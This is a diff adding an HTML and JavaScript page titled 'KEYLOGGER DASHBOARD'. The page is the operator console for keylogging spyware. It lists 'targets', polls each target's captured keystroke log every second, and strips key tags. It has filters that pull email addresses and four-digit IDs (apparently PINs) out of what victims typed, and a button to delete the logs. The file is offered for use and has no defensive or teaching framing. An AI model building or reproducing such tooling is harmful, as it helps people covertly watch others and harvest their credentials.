@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KEYLOGGER DASHBOARD</title>
+    <style>
+        body {
+            background-color: #0d0d0d;
+            color: #00ff00;
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            display: flex;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        #sidebar {
+            width: 250px;
+            background-color: #1a1a1a;
+            border-right: 1px solid #00ff00;
+            padding: 20px;
+            overflow-y: auto;
+        }
+
+        #main {
+            flex: 1;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        h1, h2 {
+            text-transform: uppercase;
+            border-bottom: 1px solid #00ff00;
+            padding-bottom: 10px;
+            margin-top: 0;
+            text-shadow: 0 0 5px #00ff00;
+        }
+
+        .file-item {
+            cursor: pointer;
+            padding: 10px;
+            margin-bottom: 5px;
+            border: 1px solid #333;
+            transition: all 0.3s;
+        }
+
+        .file-item:hover, .file-item.active {
+            background-color: #00ff00;
+            color: #000;
+            font-weight: bold;
+        }
+
+        #log-container {
+            flex: 1;
+            background-color: #000;
+            border: 1px solid #00ff00;
+            padding: 15px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            font-size: 14px;
+            box-shadow: inset 0 0 10px #003300;
+        }
+
+        #controls {
+            margin-top: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        button {
+            background-color: #000;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            padding: 10px 20px;
+            font-family: inherit;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: all 0.3s;
+        }
+
+        button:hover {
+            background-color: #00ff00;
+            color: #000;
+            box-shadow: 0 0 10px #00ff00;
+        }
+
+        button.danger {
+            border-color: #ff0000;
+            color: #ff0000;
+        }
+
+        button.danger:hover {
+            background-color: #ff0000;
+            color: #000;
+            box-shadow: 0 0 10px #ff0000;
+        }
+
+        /* Glitch effect */
+        .glitch {
+            position: relative;
+        }
+        
+        ::-webkit-scrollbar {
+            width: 10px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #1a1a1a; 
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #00ff00; 
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #00cc00; 
+        }
+    </style>
+</head>
+<body>
+
+    <div id="sidebar">
+        <h2>Targets</h2>
+        <div id="file-list">
+            <!-- Files will be loaded here -->
+            <div style="color: #666;">Scanning...</div>
+        </div>
+    </div>
+
+    <div id="main">
+        <h1 class="glitch">System Monitor // <span id="current-target">NO TARGET</span></h1>
+        
+        <div id="filter-bar" style="margin-bottom: 10px; display: flex; gap: 10px; flex-wrap: wrap;">
+            <button onclick="toggleClean()" id="btn-clean">Clean Tags</button>
+            <button onclick="toggleEmails()" id="btn-emails">Extract Emails</button>
+            <button onclick="toggleIds()" id="btn-ids">Extract IDs</button>
+            <button onclick="toggleContext()" id="btn-context">Show Context</button>
+            <input type="text" id="custom-filter" placeholder="Custom Filter (Regex)..." style="background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 10px; font-family: inherit; flex: 1;">
+            <button onclick="applyCustomFilter()">Apply</button>
+            <button onclick="resetFilters()">Reset</button>
+        </div>
+
+        <div id="log-container">Select a target from the sidebar to view logs...</div>
+        <div id="controls">
+            <span id="status">Status: IDLE</span>
+            <button id="delete-btn" class="danger" style="display: none;" onclick="deleteCurrentFile()">Delete Log</button>
+        </div>
+    </div>
+
+    <script>
+        let currentFile = null;
+        let pollInterval = null;
+        let rawLogContent = "";
+        let isCleanMode = false;
+        let isEmailMode = false;
+        let isIdMode = false;
+        let showContext = false;
+        let customFilterRegex = null;
+
+        function fetchFiles() {
+            fetch('/api/files')
+                .then(response => response.json())
+                .then(files => {
+                    const list = document.getElementById('file-list');
+                    list.innerHTML = '';
+                    if (files.length === 0) {
+                        list.innerHTML = '<div style="color: #666;">No targets found.</div>';
+                        return;
+                    }
+                    files.forEach(file => {
+                        const div = document.createElement('div');
+                        div.className = 'file-item';
+                        if (file === currentFile) div.classList.add('active');
+                        div.textContent = file;
+                        div.onclick = () => selectFile(file);
+                        list.appendChild(div);
+                    });
+                });
+        }
+
+        function selectFile(filename) {
+            currentFile = filename;
+            document.getElementById('current-target').textContent = filename;
+            document.getElementById('delete-btn').style.display = 'block';
+            
+            // Update active class
+            document.querySelectorAll('.file-item').forEach(el => {
+                el.classList.remove('active');
+                if (el.textContent === filename) el.classList.add('active');
+            });
+
+            fetchLogs();
+            
+            // Start polling
+            if (pollInterval) clearInterval(pollInterval);
+            pollInterval = setInterval(fetchLogs, 1000);
+            document.getElementById('status').textContent = "Status: MONITORING";
+        }
+
+        function fetchLogs() {
+            if (!currentFile) return;
+            
+            fetch(`/api/logs/${currentFile}`)
+                .then(response => {
+                    if (!response.ok) throw new Error('File not found');
+                    return response.json();
+                })
+                .then(data => {
+                    rawLogContent = data.content;
+                    renderLogs();
+                })
+                .catch(err => {
+                    console.error(err);
+                    if (pollInterval) clearInterval(pollInterval);
+                    document.getElementById('log-container').textContent = "Connection lost or file deleted.";
+                    document.getElementById('status').textContent = "Status: ERROR";
+                });
+        }
+
+        function renderLogs() {
+            let content = rawLogContent;
+            const container = document.getElementById('log-container');
+            const isScrolledToBottom = container.scrollHeight - container.clientHeight <= container.scrollTop + 1;
+
+            if (isCleanMode) {
+                // Remove [TAGS] like [ENTER], [BACKSPACE], etc.
+                content = content.replace(/\[.*?\]/g, '');
+            }
+
+            if (isEmailMode) {
+                const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
+                if (showContext) {
+                    const lines = content.split('\n');
+                    const matches = lines.filter(line => emailRegex.test(line));
+                    content = matches.length ? matches.join('\n') : "No lines with emails found.";
+                } else {
+                    const matches = content.match(emailRegex);
+                    content = matches ? matches.join('\n') : "No emails found.";
+                }
+            } else if (isIdMode) {
+                const idRegex = /\d{4}/; 
+                if (showContext) {
+                    const lines = content.split('\n');
+                    const matches = lines.filter(line => idRegex.test(line));
+                    content = matches.length ? matches.join('\n') : "No lines with IDs found.";
+                } else {
+                    const globalIdRegex = /\d{4}/g;
+                    const matches = content.match(globalIdRegex);
+                    content = matches ? matches.join('\n') : "No IDs found.";
+                }
+            }
+
+            if (customFilterRegex) {
+                try {
+                    const regex = new RegExp(customFilterRegex, 'gi');
+                    const lines = content.split('\n');
+                    const filteredLines = lines.filter(line => regex.test(line));
+                    content = filteredLines.length ? filteredLines.join('\n') : "No matches found for custom filter.";
+                } catch (e) {
+                    console.error("Invalid Regex", e);
+                }
+            }
+
+            container.textContent = content;
+
+            if (isScrolledToBottom) {
+                container.scrollTop = container.scrollHeight;
+            }
+        }
+
+        function toggleClean() {
+            isCleanMode = !isCleanMode;
+            updateButtonStyles();
+            renderLogs();
+        }
+
+        function toggleEmails() {
+            isEmailMode = !isEmailMode;
+            if (isEmailMode) isIdMode = false;
+            updateButtonStyles();
+            renderLogs();
+        }
+
+        function toggleIds() {
+            isIdMode = !isIdMode;
+            if (isIdMode) isEmailMode = false;
+            updateButtonStyles();
+            renderLogs();
+        }
+
+        function toggleContext() {
+            showContext = !showContext;
+            updateButtonStyles();
+            renderLogs();
+        }
+
+        function updateButtonStyles() {
+            setStyle('btn-emails', isEmailMode);
+            setStyle('btn-ids', isIdMode);
+            setStyle('btn-context', showContext);
+            setStyle('btn-clean', isCleanMode);
+        }
+
+        function setStyle(id, isActive) {
+            const btn = document.getElementById(id);
+            btn.style.backgroundColor = isActive ? '#00ff00' : '#000';
+            btn.style.color = isActive ? '#000' : '#00ff00';
+        }
+
+        function applyCustomFilter() {
+            const input = document.getElementById('custom-filter');
+            const val = input.value.trim();
+            if (val) {
+                customFilterRegex = val;
+            } else {
+                customFilterRegex = null;
+            }
+            renderLogs();
+        }
+
+        function resetFilters() {
+            isCleanMode = false;
+            isEmailMode = false;
+            isIdMode = false;
+            showContext = false;
+            customFilterRegex = null;
+            document.getElementById('custom-filter').value = '';
+            updateButtonStyles();
+            renderLogs();
+        }
+
+        function deleteCurrentFile() {
+            if (!currentFile) return;
+            if (!confirm(`Are you sure you want to delete logs for ${currentFile}?`)) return;
+
+            fetch(`/api/delete/${currentFile}`, { method: 'DELETE' })
+                .then(response => {
+                    if (response.ok) {
+                        currentFile = null;
+                        document.getElementById('current-target').textContent = "NO TARGET";
+                        document.getElementById('log-container').textContent = "Log deleted.";
+                        document.getElementById('delete-btn').style.display = 'none';
+                        document.getElementById('status').textContent = "Status: IDLE";
+                        if (pollInterval) clearInterval(pollInterval);
+                        fetchFiles();
+                    }
+                });
+        }
+
+        // Initial load
+        fetchFiles();
+        // Refresh file list every 5 seconds
+        setInterval(fetchFiles, 5000);
+
+    </script>
+</body>
+</html>
